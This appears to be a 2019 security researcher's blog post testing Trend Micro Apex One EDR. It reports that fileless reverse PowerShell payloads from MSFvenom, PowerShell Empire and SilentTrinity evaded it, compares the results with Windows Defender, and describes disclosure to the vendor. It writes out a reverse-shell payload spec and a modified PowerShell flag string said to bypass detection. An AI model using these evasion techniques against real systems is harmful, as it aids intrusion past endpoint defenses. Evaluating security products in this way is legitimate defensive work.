# Bypassing Trend Micro Apex One

![Linkedin](Post%20Images/linkedin.png) [Linkedin](https://www.linkedin.com/in/ryangore/) | ![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

## Background

Here's the [solution brief](www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html?modal=overview-apex-f2049a) about Apex One.

Obviously, a product like this isn't going to prevent bleeding-edge methods or techniques that are used to get around them. The same goes for customized payloads. For example, the simple reverse PowerShell script I wrote gets around Defender and AMSI in Windows 10 build 1903 as of June 7th. The art of bypassing anti-virus and EDR solutions is a whole other topic on its own that consists of individuals who know much more than I do when it comes to this type of stuff.

Before you ask, yes I did check the settings in the administration console. I double checked, triple checked, checked a fourth time, and then checked again for the hell of it. Other colleagues and individuals from Trend have checked the settings. I'm sure they would have told me to shove off by now and check again if it was something on my end.

![bms](Post%20Images/TMAO-Bypass-imgs/misc-imgs/BMS.PNG)
![scs](Post%20Images/TMAO-Bypass-imgs/misc-imgs/SCS.PNG)

## Testing

I wanted to test Apex One to see if it works as advertised, rather than setting it up, changing necessary settings and forgetting about it. For the sake of testing, the scenario was set in a situation in which an attacker had some sort of access to the machine. This could be a reverse shell via an exploit, recovered creds that allows for smblogin, login through RDP, etc. Needless to say, I was a bit shocked when I discovered how trivial it was to skate around Apex. Before I started testing, I had done enough research to know the basics or at least have a decent grasp on the thought process that went into the techniques of bypassing AV and EDR solutions. As expected, Apex was alerting and blocking anything malicious that touched the disk. However, things started going downhill when I started testing file-less payloads or ones that resided in memory only. Keep in mind I wasn't trying to get sophisticated or do anything advanced. All I was doing at this point was using well known and publicly available tools and frameworks and throwing them at my test machine to see if the agent would alert on it. All I wanted to do was to make sure it was stopping known or old payloads and tools.

### Tools and payloads that were used to bypass Apex One

* MSFvenom: cmd/windows/reverse_powershell lhost=\<attackip\> lport=\<attakport\>
* PowerShell Empire with http listener and launcher to generate the stager
* My custom reverse PowerShell script
* A random reverse [PowerShell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
* SilentTrinity


## MSFVenom cmd/windows/reverse_powershell

![msfv_1](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/msfv_kalivm.PNG)
![msfv_2](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/Win10Prod.PNG)
![msfv_3](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/msfvenom_payload.PNG)
![msfv_4](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/Win10Prod_rpsh_exec.PNG)
![msfv_5](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/msfv_bypass.PNG)
![msfv_6](Post%20Images/TMAO-Bypass-imgs/MSFvenom-imgs/msfv_bypass2.PNG)

## Observations & Anomalies

## PowerShell Empire

I worked with Trend to get a patch pushed out to specifically alarm on PowerShell Empire (they're still working on having Apex detect the MSFvenom cmd/windows/reverse_powershell payload). Apex received the patch on May 8th and I was still able to get around Apex with Empire. On the 23rd of May, Apex had for the first time in my environment, successfully prevented the callback to Empire. Everything was fine and dandy until on June 5th, I tested Apex again for the sake of consistency. Apex once again failed to prevent the callback the Empire instance running on my Kali machine. At this time I noticed that the IP on my Kali box had changed. Thus, began the trend of inconsistencies.

While testing after the 5th of June, I noticed three things. The first one is that changing the IP of my Kali machine looked like it had some role in Empire being successful again, but I highly doubt it would be that simple to outmaneuver and EDR solution like that. The second anomaly was the effect of base64 encoded payloads. When using the MSFvenom payload cmd/windows/reverse_powershell in conjunction with the Magic Unicorn payload generator from TrustedSec, Apex One was alerting on it. Apex seems to ignore it if I just straight up generate the payload with MSFvenom with no encoding. My basic knowledge of how AV and EDR technologies work leads me to believe that the engine is building a risk rating based on several factors or attributes associated with the PowerShell code. Since the PowerShell code is obfuscated via base64 encoding, it uses this information as one factor along with several other factors to determine whether or not it is harmful or suspicious. In this case, it correctly identified that the payload generated from the Magic Unicorn payload generator is indeed malicious. Before the May 8th patch, the opposite seemed to be occurring when using the base64 encoded PowerShell payload generated from the launcher command in Empire. With this in mind, I decided to decode the base64 encoded payload Empire produced. It seemed to have worked for a short while before Apex catched on and started blocking it.

The third and final anomaly that has been the most consistent in getting me around Apex since the update is simply changing the [flags](https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1). These flags are used with the `powershell` command before the base64 encoded payload body. Based on my observations during testing, Apex is very inconsistent when alerting on this method. Sometimes it will alert if I leave the default flags `powershell -w hidden -noP`. Sometimes it will alert if I tweak them. Sometimes it won't alert either way. I'm not exactly sure why this is though. My guess is that the *'machine learning'* component of Apex is not up to snuff and could use some more work. I even used some of the modules that Empire provided thinking that Apex would alert on those. Unfortunately, when using some of the modules like `powershell/privesc/ask`, Apex did not alert on any of them.

#### Default payload generation

![PSE_default_bypass](Post%20Images/TMAO-Bypass-imgs/Empire-imgs/default2.PNG)
![PSE_default_privesc](Post%20Images/TMAO-Bypass-imgs/Empire-imgs/privesc_success2.PNG)

#### Payload tweak & modification

Note the following: `powershell -executionpolicy unrestricted -nologo -noexit -noninteractive -encoded`

![PSE_mod](Post%20Images/TMAO-Bypass-imgs/Empire-imgs/pse_tweak.PNG)


## A Shocking Revelation

During testing, I needed to gather metrics from other AV and EDR solutions to compare against Apex One. Why not start with Windows Defender in the latest Windows 10 Pro build? I created an ISO build 1803 (and later 1903 after testing a trial version of CrowdStrike Falcon Prevent), installed the latest updates for the operating system and definitions for Defender. The results shocked me, to say the least. You'd think a free, built-in AV that comes with Windows would be absolute trash, but it's quite the opposite. From my testing, Windows Defender and ASMI in build 1803 were able to block almost everything Apex One wasn't. It even blocked the aforementioned PowerShell oneliner from the GitHub link.

![Github One-liner](Post%20Images/TMAO-Bypass-imgs/misc-imgs/amsi_github_oneliner.PNG)

However, I was able to get around it using my custom reverse PowerShell script (this was expected) and silenttrinity. Defender and ASMI did even better in build 1903 as it stone-walled everything except my custom reverse PowerShell script. I should state that more testing will need to be done with silenttrinity as I didn't receive a message from AMSI or Defender saying something malicious was going on. However, I did receive an error message telling me that the PowerShell stager with the embedded interpreter for the Boo Lang or Iron Python based payload and the MSBuild.xml stagers failed to build correctly. This could be due to changes in the Windows operating system itself in build 1903 or changes in PowerShell and the .NET framework. Furthermore, to rule out the environment as being the culprit of the issues with Apex One, I decided to unload and remove the Apex agent from a production workstation that wasn't important, let Defender take over and perform the same tests. Again, Defender stopped what Apex One couldn't.

# Updates

## Update #1: June 21st 2019

1. Currently, Apex One can be bypassed using simple or even very basic payloads that mostly reside in memory.
2. Currently, Apex One can be bypassed using exploit tools or frameworks that have aged well beyond the point where many would logically think that most vendors would have a solution to detect their signatures, etc.

* The majority of the payloads that I've created or generated and that have touched the disk were detected as they should be.
* By mere observation, it looks like Trend is having trouble detecting malicious code that runs in memory and in some way interacts with the .NET framework via a .NET language, etc.
* Furthermore, the current factors or attribute flags used to help the engine determine whether or not this code is malicious are simply not sufficient enough in **my opinion**.
* Microsoft's Windows Defender via the latest Windows 10 build (1903) does a suprisingly better job.

## Update #2: June 26th 2019

Apex One seems to be consistently alerting on PowerShell Empire payloads in which I don't change or modify the default launcher value when setting up a listener. However, upon speaking with the team at Trend Micro, they informed me that they would have to open another ticket. I guess that means the simple technique I was using by changing the flags used with the PowerShell command is a separate and completely new issue. So, I basically found a way to bypass the update that was pushed out on May 8th before the day was over with. campfire
